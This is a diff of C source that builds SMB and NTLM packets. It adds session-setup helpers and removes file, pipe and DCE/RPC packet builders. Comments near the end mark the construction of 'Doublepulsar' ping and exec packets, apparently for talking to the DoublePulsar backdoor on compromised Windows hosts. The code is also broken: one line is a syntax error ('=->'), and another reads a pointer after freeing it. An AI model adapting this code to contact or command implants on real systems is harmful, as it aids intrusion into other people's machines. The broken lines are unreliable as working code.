@@ -203,6 +203,44 @@ int BuildTreeConnectAndXStub(char *destination,char *password, char *resource, c
 //SMB Negotiation
 char *AddDialect(char *data, char *name, uint8 type, int *PacketSize);
 
+
+smheader *BuildSmbPacket1(void)
+{
+	char buf2[4096];
+	smheader *SmbPacket1;
+	memset((char*)buf2,'\0',sizeof(buf2));
+	BuildAuthRequest((tSmbNtlmAuthRequest*)buf2,0,NULL,NULL);
+#ifdef _DBG_
+	DumpMem((char*)buf2,SmbLength((tSmbNtlmAuthRequest*)buf2));
+#endif
+	SmbPacket1=BuildSmbPacket((smheader*)NULL,SESSIONSETUPANDX,0,buf2,40);
+
+	return(SmbPacket1);
+}
+/*********************************************/
+smheader *GetSmbPacket2(RELAY *relay,smheader* Packet1)
+{
+	char *buffer=(char*)malloc(4096);
+	int i;
+    i=SendBytesAndWaitForResponse(relay->destination,(char*)Packet1, SmbPacketLen(Packet1), buffer,4096,SMBWAITTIMEOUT);
+	if (i>0){
+		return((smheader*)buffer);
+	}
+	return(NULL);
+}
+/*********************************************/
+smheader *GetSmbPacket3(smheader* SmbPacket2,char *lpUserName, char *lpPassword,  char *domainname, char *host, tSmbNtlmAuthResponse* OptionalNtlmPacket3)
+{
+	char buf2[16384];
+	smheader *SmbPacket3;
+	memset((char*)buf2,'\0',sizeof(buf2));
+	buildAuthResponse((tSmbNtlmAuthChallenge*)GetNTLMPacketFromSmbPacket(SmbPacket2),(tSmbNtlmAuthResponse*)buf2,0,lpUserName,lpPassword,domainname,host, OptionalNtlmPacket3);
+    //DumpMem((void*)buf2,sizeof(tSmbNtlmAuthResponse));
+	SmbPacket3=BuildSmbPacket((smheader*)SmbPacket2,SESSIONSETUPANDX,0,buf2,(int)SmbLength((tSmbNtlmAuthResponse *)buf2));
+	return(SmbPacket3);
+}
+
+
 int BuildTreeConnectAndXStub(char *destination,char *password, char *resource, char *service)
 {
     TreeConnectAndX *message=(TreeConnectAndX*)destination;
@@ -388,109 +426,7 @@ smheader *BuildSmbPacket(smheader *PreviousSmbMessage,uint8 SmbCommand,uint8 Sub
         }
 		break;
 
-	case FINDFIRST2:
 
-		FIND_FIRST2Message=(FIND_FIRST2 *)malloc(sizeof(FIND_FIRST2));
-        if (DataSize > sizeof(NewSmbPacket->buffer)) {
-            NewSmbPacket=(smheader*)realloc(NewSmbPacket,sizeof(smheader) + DataSize);
-
-        }
-		memset((char*)FIND_FIRST2Message,'\0',sizeof(FIND_FIRST2));
-        NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)- sizeof(NewSmbPacket->buffer) +sizeof(FIND_FIRST2) -sizeof(FIND_FIRST2Message->SearchPattern) + (DataSize+1)*2   -4 );
-		if (PreviousSmbMessage!=NULL){
-			NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
-		}
-
-		FIND_FIRST2Message->WordCount=15;
-		FIND_FIRST2Message->TotalParameterCount=18;
-		FIND_FIRST2Message->TotalDataCount=0;
-		FIND_FIRST2Message->MaxParameterCount=10;
-		FIND_FIRST2Message->MaxDataCount=16384;
-		FIND_FIRST2Message->MaxSetupCount=0;
-		FIND_FIRST2Message->reserved=0;
-		FIND_FIRST2Message->flags=0x0000;
-		FIND_FIRST2Message->timeout=0; //No Timeout
-		FIND_FIRST2Message->reserved2=0;
-        FIND_FIRST2Message->ParameterCount=12 + (DataSize+1)*2;//18; //sizeo of Find_First2 struct
-		FIND_FIRST2Message->ParameterOffset=68; //default offset. We are only sending static messages
-		FIND_FIRST2Message->DataCount=0;
-		FIND_FIRST2Message->DataOffset=0;
-		FIND_FIRST2Message->SetupCount=1;
-		FIND_FIRST2Message->reserved3=0;
-		FIND_FIRST2Message->SubCommand=0x01; //FIND_FIRST2
-        //4 setfs quote
-		FIND_FIRST2Message->ByteCount=3+ 12 + (DataSize+1)*2;//21; //sizeof(->find_First2 + Padding )
-
-        FIND_FIRST2Message->SearchAttributes=0x16;
-        FIND_FIRST2Message->SearchCount=1366;
-        FIND_FIRST2Message->Searchflags=0x0006;
-        FIND_FIRST2Message->LevelOfInterest=260;
-        FIND_FIRST2Message->StorageType=0;
-        
-        FIND_FIRST2Message->SearchPattern=(uint8*)malloc((DataSize+1)*2);
-        memset(FIND_FIRST2Message->SearchPattern,'\0',(DataSize+1)*2);
-
-        chartoWide((char*)FIND_FIRST2Message->SearchPattern,(char*)data,DataSize );
-        //memcpy((char*)&FIND_FIRST2Message->SearchAttributes,(char*)FIND_FIRST2Message->SearchPattern,12 );
-        /*
-        memcpy((char*)&FIND_FIRST2Message->SearchPattern[0],(char*)data,DataSize );
-        memcpy((char*)&FIND_FIRST2Message->SearchPattern[DataSize],(char*)data,DataSize );
-        */
-
-
-        memcpy(NewSmbPacket->buffer,(char*)FIND_FIRST2Message, 48);// + (DataSize+1)*2);//sizeof(FIND_FIRST2));
-        memcpy(NewSmbPacket->buffer +48,(char*)FIND_FIRST2Message->SearchPattern, (DataSize+1)*2);//
-        free(FIND_FIRST2Message);
-        free(FIND_FIRST2Message->SearchPattern);
-		break;
-
-	case NTCREATEANDX:
-		NTCreateAndXMessage=(NTCreateAndX *)malloc(sizeof(NTCreateAndX));
-		memset((char*)NTCreateAndXMessage,'\0',sizeof(NTCreateAndX));
-		NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(NTCreateAndX) + (strlen((char*)data)+1)*sizeof(WCHAR) -4 );
-
-		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
-		NTCreateAndXMessage->WordCount=24;
-		NTCreateAndXMessage->AndXCommand=0xff; //0xff no further command
-		NTCreateAndXMessage->reserved2=0; 
-		NTCreateAndXMessage->AndXOffset=0xdede;  
-		NTCreateAndXMessage->FilenameLen=(uint16)(strlen((char*)data))*sizeof(WCHAR);
-		NTCreateAndXMessage->CreationFlags=0x16;
-		NTCreateAndXMessage->RootFID=0;
-
-		//We call readFileToSend with response+1 because filename is in the following format " \ + filename"
-		NTCreateAndXMessage->AllocationSize=DataSize;//ReadFileToSend(NULL,(char*)data+1);
-		NTCreateAndXMessage->AllocationSizeHigh=0;	
-		NTCreateAndXMessage->Impersonation=0x02;
-		NTCreateAndXMessage->SecurityFlags=0x03;
-
-		if (DataSize==0){ //pipe
-			NTCreateAndXMessage->ShareAccess=0x03; //SHARE_READ & SHARE_WRITE
-			NTCreateAndXMessage->Disposition=0x01;
-			NTCreateAndXMessage->CreateOptions=0x00400040;
-			NTCreateAndXMessage->AccessMask=0x0002019f;
-			NTCreateAndXMessage->FileAttributes=0;
-		} else { //file
-			NTCreateAndXMessage->ShareAccess=0;
-			NTCreateAndXMessage->Disposition=0x05; //overwrite + create
-			NTCreateAndXMessage->CreateOptions=0x44;
-			NTCreateAndXMessage->AccessMask=0x30196;
-			NTCreateAndXMessage->FileAttributes=0x20;
-		}
-
-		NTCreateAndXMessage->ByteCount=NTCreateAndXMessage->FilenameLen+2+1; //Append wideNullChar and 1 extra byte
-		NTCreateAndXMessage->padding=0;
-		memcpy(NewSmbPacket->buffer,(char*)NTCreateAndXMessage,sizeof(NTCreateAndX));
-
-		memset((char*)lpFileNameW,'\0',sizeof(lpFileNameW));
-		//		mbstowcs(lpFileNameW,(char*)data,strlen((char*)data) );
-		chartoWide((char*)lpFileNameW,(char*)data,(int)strlen((char*)data) );
-#ifdef _DBG_
-		printf("Data: %S\n",lpFileNameW);
-#endif
-		memcpy(NewSmbPacket->buffer+sizeof(NTCreateAndX),(char*)lpFileNameW,(strlen((char*)data)+1)*sizeof(WCHAR) );
-        free(NTCreateAndXMessage);
-		break;
 
 
 
@@ -507,164 +443,6 @@ smheader *BuildSmbPacket(smheader *PreviousSmbMessage,uint8 SmbCommand,uint8 Sub
 		memcpy((char*)&CloseMessage->FID,(char*)data,2);
 		memcpy(NewSmbPacket->buffer,(char*)CloseMessage,sizeof(CLOSE));	
         free(CloseMessage);
-		break;
-
-
-
-	case READANDX:
-		ReadAndXMessage=(ReadAndX *)malloc(sizeof(ReadAndX));
-		memset((char*)ReadAndXMessage,'\0',sizeof(ReadAndX));
-		NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(ReadAndX) -4 );
-		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
-    
-		ReadAndXMessage->WordCount=12;
-		ReadAndXMessage->AndXCommand=0xff; //0xff no further command
-		ReadAndXMessage->reserved2=0x00; 
-		ReadAndXMessage->AndXOffset=0xdede; 
-		//ReadAndXMessage->FID este valor lo rellenamos fuera dado que aqui no tenemos la información  necesaria. Es el identificador del ultimo fichero abierto.
-		/*
-		NTCreateAndXMessage = (NTCreateAndX*)SmbMessage->buffer;
-		memcpy(&ReadAndXMessage->FID,(char*)NTCreateAndXMessage+6,2);
-		*/
-		//		printf("FID: %4.4x\n",ReadAndXMessage->FID);
-		ReadAndXMessage->offset=0x00000000;
-		ReadAndXMessage->MaxCountLow=1024;
-		ReadAndXMessage->MinCount=1024;
-		ReadAndXMessage->reserved=0xffffffff;
-		ReadAndXMessage->remaining=1024;
-		ReadAndXMessage->HighOffset=0;
-		ReadAndXMessage->ByteCount=0;
-		memcpy(NewSmbPacket->buffer,(char*)ReadAndXMessage,sizeof(ReadAndX));
-        free(ReadAndXMessage);
-		break;
-
-
-
-	case WRITEANDX:
-		WriteAndXMessage=(WriteAndX *)malloc(sizeof(WriteAndX));
-		memset((char*)WriteAndXMessage,'\0',sizeof(WriteAndX));
-		NTCreateAndXMessage = (NTCreateAndX*)PreviousSmbMessage->buffer;
-		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
-		WriteAndXMessage->WordCount=14;
-		WriteAndXMessage->AndXCommand=0xff;
-		WriteAndXMessage->reserved2=0;
-		WriteAndXMessage->AndXOffset=0xdede;
-		memcpy(&WriteAndXMessage->FID,(char*)NTCreateAndXMessage+6,2);
-
-		WriteAndXMessage->Offset=0;
-		WriteAndXMessage->reserved=0xffffffff;
-		WriteAndXMessage->DataLengthHigh=0;
-		WriteAndXMessage->DataOffset=64;
-		WriteAndXMessage->HighOffset=0;
-		WriteAndXMessage->Padding=0xee;	
-
-		switch (SubCommand)
-		{
-		case 0: //Default WriteAndX Operation
-			NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(WriteAndX) +DataSize -4 );
-			WriteAndXMessage->WriteMode=0;
-			WriteAndXMessage->Remaining=0;
-			WriteAndXMessage->DataLengthLow=DataSize;
-			WriteAndXMessage->ByteCount=DataSize+1;
-			memcpy(NewSmbPacket->buffer,(char*)WriteAndXMessage,sizeof(WriteAndX));
-			memcpy(NewSmbPacket->buffer+sizeof(WriteAndX),(char*)data,DataSize);
-            free(WriteAndXMessage);
-			break;
-		case  RPCBIND:
-			//i=116; //size of the ctx struct + dce
-			//Interface: SVCCTL UUID: 367abb81-9844-35f1-ad32-98f038001003
-			//Transfer Syntax: 8a885d04-1ceb-11c9-9fe8-08002b104860
-            
-			//Transfer Syntax: 6cb71c2c-9812-4540-0100-000000000000
-            //ctx=AddBinddingInformation(ctx,"367abb81-9844-35f1-ad32-98f038001003","6cb71c2c-9812-4540-0100-000000000000",2,0,&i);
-            //DumpMem((char*)ctx,i);
-			//NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(WriteAndX) + sizeof(DceRpcBind) + i -4);
-            NewSmbPacket->SmbMessageLength=SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(WriteAndX) + sizeof(DceRpcBind) + DataSize -4);
-			WriteAndXMessage->WriteMode=0x08;
-			WriteAndXMessage->Remaining=DataSize + sizeof(DceRpcBind);
-			WriteAndXMessage->DataLengthLow=DataSize + sizeof(DceRpcBind);
-			WriteAndXMessage->ByteCount=DataSize+ sizeof(DceRpcBind) +1;
-			memcpy(NewSmbPacket->buffer,(char*)WriteAndXMessage,sizeof(WriteAndX));
-
-			dcerpcbind=(DceRpcBind*)malloc(sizeof(DceRpcBind));
-			memset((char*)dcerpcbind,'\0',sizeof(DceRpcBind));
-			dcerpcbind->VersionMayor=5;
-			dcerpcbind->VersionMinor=0;
-			dcerpcbind->PacketType=SubCommand; //Bind
-			dcerpcbind->PacketFlags=0x03;
-			dcerpcbind->DataRepresentation=0x00000010;
-			dcerpcbind->FragmentLength=sizeof(DceRpcBind) + DataSize;
-			dcerpcbind->AuthLength=0;
-			dcerpcbind->CallID=1;
-			dcerpcbind->MaxXmitFragment=4280;
-			dcerpcbind->MaxRecvFragment=4280;
-			dcerpcbind->AssocGroup=0;
-            dcerpcbind->NumberOfCtx=DataSize / sizeof(CtxItem);
-            
-			memcpy(NewSmbPacket->buffer +sizeof(WriteAndX) ,(char*)dcerpcbind,sizeof(DceRpcBind));
-            memcpy(NewSmbPacket->buffer +sizeof(WriteAndX) + sizeof(DceRpcBind),(char*)data,DataSize);
-            
-            free(dcerpcbind);
-            free(WriteAndXMessage);
-			break;
-		default:
-			printf("Unsupported WriteAndX option\n");
-			return(NULL);
-			break;
-		}		
-		break;
-
-
-	case SMB_COM_TRANSACTION:
-		TransRequest=(SMB_COM_TRANSACTION_STRUCT *)malloc(sizeof(SMB_COM_TRANSACTION_STRUCT));
-		memset((char*)TransRequest,'\0',sizeof(SMB_COM_TRANSACTION_STRUCT));
-		NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
-		TransRequest->WordCount=16;
-		TransRequest->TotalParameterCount=0 ;
-		TransRequest->MaxDataCount=1024;
-		TransRequest->MaxParameterCount=0;
-		TransRequest->MaxSetupCount=0;
-		TransRequest->reserved=0;
-		TransRequest->flags=0;
-		TransRequest->timeout=0x00000000;
-		TransRequest->reserved2=0;
-		TransRequest->ParameterCount=0;
-		TransRequest->ParameterOffset=84;
-		TransRequest->DataOffset=84;
-		TransRequest->SetupCount=2; 
-		TransRequest->reserved3=0;
-
-        TransRequest->Function=0x26; //TRANSACT Named PIPE
-		TransRequest->padding=0;		
-		memcpy((char*)TransRequest->TransactionName,"\x5c\x00\x50\x00\x49\x00\x50\x00\x45\x00\x5c\x00\x00\x00",14);
-		TransRequest->padding2=0;
-
-        dcerpc=(DceRpcRequest*)malloc(sizeof(DceRpcRequest));
-		memset((char*)dcerpc,'\0',sizeof(DceRpcRequest));
-		dcerpc->VersionMayor=5;
-		dcerpc->VersionMinor=0;
-		dcerpc->PacketType=0;
-		dcerpc->PacketFlags=3;
-		dcerpc->DataRepresentation=0x00000010;
-		dcerpc->AuthLength=0;
-		dcerpc->CallID=1;
-		dcerpc->ContextID=0;
-		dcerpc->OpNum=SubCommand;
-        //--------
-
-        NewSmbPacket->SmbMessageLength=(uint16)SREV (sizeof(smheader)-sizeof(NewSmbPacket->buffer) +sizeof(SMB_COM_TRANSACTION_STRUCT) + sizeof(DceRpcRequest) + DataSize -4);	
-        TransRequest->TotalDataCount=(uint16)sizeof(DceRpcRequest) + DataSize;//sizeof(MSCStruct) + (uint16) (strlen((char*)data)+1)*sizeof(WCHAR) + 2*((((int)strlen((char*)data)+1)%2) ==1)  ;	
-		TransRequest->DataCount=TransRequest->TotalDataCount;				
-		TransRequest->ByteCount=TransRequest->TotalDataCount + 17; 					
-		dcerpc->FragmentLength=TransRequest->TotalDataCount;					
-        //dcerpc->AllocHint=sizeof(DceRpcRequest) +DataSize; //Changed 10, Sept
-		dcerpc->AllocHint=DataSize; 
-
-		memcpy(NewSmbPacket->buffer,(char*)TransRequest,sizeof(SMB_COM_TRANSACTION_STRUCT));
-		memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT),(char*)dcerpc,sizeof(DceRpcRequest));
-        memcpy(NewSmbPacket->buffer+sizeof(SMB_COM_TRANSACTION_STRUCT) +sizeof(DceRpcRequest),(char*)data,DataSize);
-        free(TransRequest);
-		free(dcerpc);
 		break;
 
 
@@ -808,15 +586,7 @@ smheader *BuildSmbPacket(smheader *PreviousSmbMessage,uint8 SmbCommand,uint8 Sub
     case SMB_COM_GET_PRINT_QUEUE:
     case SMB_COM_READ_BULK:
     case SMB_COM_WRITE_BULK:
-    case SMB_COM_WRITE_BULK_DATA:
-	
-         NewSmbPacket->SmbMessageLength=(uint16) SREV (sizeof(smheader)- sizeof(NewSmbPacket->buffer) + DataSize -4 );
-         NewSmbPacket->flags2=0x4803; //No Unicode
-         NewSmbPacket->TreeId=((smheader *)PreviousSmbMessage)->TreeId;
-         memcpy((char*)NewSmbPacket->buffer,data,DataSize);
-		//printf("Unsupported SMB message\n");
-		//exit(1);
-         break;
+   
      default:
          //printf("Unsupported SMB message\n");
          free(NewSmbPacket);
@@ -953,7 +723,7 @@ i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(pack
   
   
   
-  //Build Doublepulsar Ping packet
+  //Build Doublepulsar Ping packet here
   ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->UserID = SmbPacket2->UserID;
 	MultpleID=0x41;
 	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->multipleID=->MultpleID;
@@ -962,16 +732,11 @@ i=SendBytesAndWaitForResponse(relay.destination,(char*)packet, SmbPacketLen(pack
   
   
   
-  //Build Doublepulsar EXEC packet
+  //Build Doublepulsar EXEC packet here
   ((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->UserID = SmbPacket2->UserID;
 	MultpleID=0x42;
 	((SMB_COM_TRANSACTION_STRUCT*)packet->buffer)->multipleID=->MultpleID;
   
-  
-  
-  
-  
-
   return 0;
 }
 
